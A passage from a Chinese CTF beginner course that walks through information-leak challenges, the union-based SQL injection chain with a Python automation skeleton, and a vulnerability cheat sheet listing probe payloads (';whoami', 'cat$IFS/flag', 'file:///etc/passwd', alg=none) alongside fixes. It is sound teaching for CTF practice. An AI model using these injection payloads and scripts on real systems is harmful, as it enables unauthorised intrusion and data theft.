## 入门题精讲：信息泄露类

*约 35 分钟*

> 🎯 **本节目标**：用完整流程解一道信息泄露题，把「七件事起手式」真正走一遍。

本节不提供题目环境，请用 CTFHub 的「信息泄露」专项自己做，再对照下面的流程检查自己的动作。

**线索 → 动作对照**

| 题面线索 | 立刻想到 | 具体动作 |
| --- | --- | --- |
| 备份文件 / 网站源码 | www.zip、web.zip、index.php.bak | 直接猜文件名下载 |
| 版本控制 / Git | .git/ 泄露 | curl /.git/config → GitHack 还原 |
| 编辑器 / 临时文件 | .index.php.swp、~ 结尾 | 下载后用 vim -r 恢复 |
| robots / 爬虫协议 | 隐藏路径 | 读 robots.txt 里的 Disallow |
| 源码里有数据库配置 | 弱口令 / 未授权 | 连数据库或从源码里直接读 flag |
| 响应头暴露版本 | 框架已知漏洞 | 按版本搜公开利用 |

1. 先读题面：如果题名/描述提到「备份」「源码」「Git」，直接从对应文件名猜起，不要先扫目录。
2. 试 `/robots.txt`、`/.git/config`、`/www.zip`、`/index.php.bak` 四个请求。
3. 拿到源码后先全局搜 `flag`、`password`、`key`、`host`，再看路由。
4. 如果拿到的是 .git，还原后看 `git log --all`——flag 常在「已经被删掉」的提交里。
5. 把每一步的结论写进笔记：哪个动作命中了、耗时多少。

> 💡 信息泄露题往往「十分钟内解决」，收益极高。养成习惯：**每道题都先花两分钟做一次信息收集**，再决定要不要深入。

## 入门题精讲：SQL 注入全流程

*约 45 分钟*

> 🎯 **本节目标**：从判断注入到拿到数据，完整走一遍，并把它写成可复用的脚本。

**完整链路（八步）**

```
① 判断：id=1' 报错 -> 有注入
② 字段数：order by 1..N 直到报错
③ 显位：union select 1,2,3（前缀用 -1）
④ 库名：database()
⑤ 表名：information_schema.tables
⑥ 列名：information_schema.columns
⑦ 数据：group_concat(username,0x3a,password)
⑧ 若字符被过滤：用 hex / char() / 盲注脚本
```

**每一步的判断标准**

| 步骤 | 怎么判断成功 | 失败怎么办 |
| --- | --- | --- |
| ① 判断注入 | 单引号报错 / 真假响应不同 | 换 \ / ) / " 闭合符；换 POST |
| ② 字段数 | order by N 报错，N-1 是字段数 | 从 1 二分/逐个试到 20 |
| ③ 找显位 | 页面出现 1 2 3 中的数字 | 检查是否被过滤，改用报错注入 |
| ④⑤⑥ 元数据 | 出现库名/表名/列名 | 确认 information_schema 可用（MySQL） |
| ⑦ 取数据 | 出现目标字段值 | 字段被过滤就用 hex/char 拼接 |
| ⑧ 绕过 | payload 能执行 | 见 p5l4 的 WAF 绕过表 |

做完后，用 PART 4 学的 requests 写一个脚本，把 ①~⑦ 自动化。这一步是「从会做到会写工具」的分水岭——以后同类题改个 URL 就能复用。

**把它写成脚本（骨架）**

```python
import requests

BASE = "http://target/"

def q(payload):
    return requests.get(BASE, params={"id": payload}, timeout=10).text

# 1) 判断字段数
for n in range(1, 21):
    r = q(f"1 order by {n} -- ")
    if "error" in r.lower() or "报错" in r:
        print("字段数 =", n - 1); break

# 2) 取库名（假设显位是第 2 列）
print(q("0 union select 1,database(),3 -- "))

# 3) 取表名 → 列名 → 数据（照同样结构替换 SQL 即可）
```

> 💡 把脚本存下来。以后遇到同类题，改个 URL 就能复用——这就是你自己积累的工具库。

## 综合复盘：把学过的压成一张表

*约 35 分钟*

> 🎯 **本节目标**：产出一份属于你自己的「漏洞速查表」，并找出自己的薄弱点。

下面是一张空表模板，请你按自己的理解填（可以先把本页的表格「复制」到笔记，再逐行填）。填不出来的行，就是你下一步该补的模块。

**漏洞速查表（模板）**

| 漏洞 | 入口特征 | 判断方法 | 典型 payload | 修复 |
| --- | --- | --- | --- | --- |
| SQL 注入 | ?id= 数字 | 单引号报错 / 真假差异 | union select / sleep() | 参数化查询 |
| XSS | 输入被回显 | 输入 **alert(1)** 看是否执行 | img onerror | 按上下文转义 + CSP |
| 文件上传 | 有 upload 表单 | 传 php 看是否被解析 | .htaccess / 图片马 | 白名单 + 重命名 + 禁执行 |
| 文件包含 | ?page= / ?file= | 传 ../../ 看报错 | php://filter | 白名单路径映射 |
| SSRF | ?url= / ?image= | 传 DNSLog 看回连 | 127.0.0.1 / gopher | 协议 + IP 白名单 + 禁跳转 |
| 命令执行 | ?cmd= / ?exec= | 传 ;whoami | cat$IFS/flag | 不用 shell / 白名单 |
| 反序列化 | 参数像序列化串 / base64 | 改长度看报错 | pop 链 / phpggc | 不接受外部序列化数据 |
| SSTI | {{7*7}} 回显 49 | 数学表达式探测 | __class__ 链 | 用户输入只当变量 |
| XXE | 接受 XML | 实体引用读文件 | file:///etc/passwd | 禁用 DTD / 外部实体 |
| JWT | 三段 base64 | 解 payload 看角色 | alg=none / 弱密钥 | 固定算法 + 强密钥 |
| 越权 | ?id= 能看别人数据 | 改 id 重放 | 水平/垂直越权 | 从 session 取用户身份 |

1. 只看「入口特征」和「判断方法」两列，能不能反过来想起漏洞名？
2. 把「典型 payload」默写一遍，写不出的标记出来。
3. 把「修复」列遮住，自己说一遍防御思路。
4. 把标记出来的行整理成「下周要补的 3 件事」。

> 💡 手写一遍比复制强十倍。写完你会发现自己对某些列「填不出来」——那些就是你的薄弱点。**这张表就是你以后做题时翻的东西。**

## 下一阶段：如何持续进步

*约 25 分钟*

> 🎯 **本节目标**：知道课程结束后该往哪走，并把「持续」变成一套可执行的机制。

**三个阶段的目标**

| 阶段 | 时间 | 目标 | 衡量方式 |
| --- | --- | --- | --- |
| 打基础 | 现在–3 个月 | 走完零基础 10 节 + PART 1–4 | 能独立起服务、改包、读 JS |
| 能做题 | 3–9 个月 | PART 7 的 18 个节点能独立复现，并说清根因 | 新手题 10 分钟内判断题型 |
| 能比赛 | 9–18 个月 | 打完整一场比赛并复盘 | 有 WriteUp、有 payload 库、有稳定节奏 |

- **固定刷题节奏**：每周 2–3 道，重点在复盘而不是数量。
- **建立自己的 payload 库**：按漏洞分类，每条注明适用条件。
- **写 WriteUp**：公开发布会倒逼你写清楚原理。
- **跟进组件漏洞**：Java 生态（Shiro/Fastjson/Log4j）与 PHP 生态（ThinkPHP/Laravel）的版本漏洞。
- **参加比赛**：MoeCTF、NSSCTF、CTFHub 的周赛都是好起点。

> 💡 半年能到达的合理目标是：看到一道基础 Web 题，能在 10 分钟内判断题型并列出尝试顺序。**这已经超过大多数新手了。**至于以后走渗透、应用安全还是主机安全，见 p2b5「三类岗位」那张表——方向不同，重点不同。
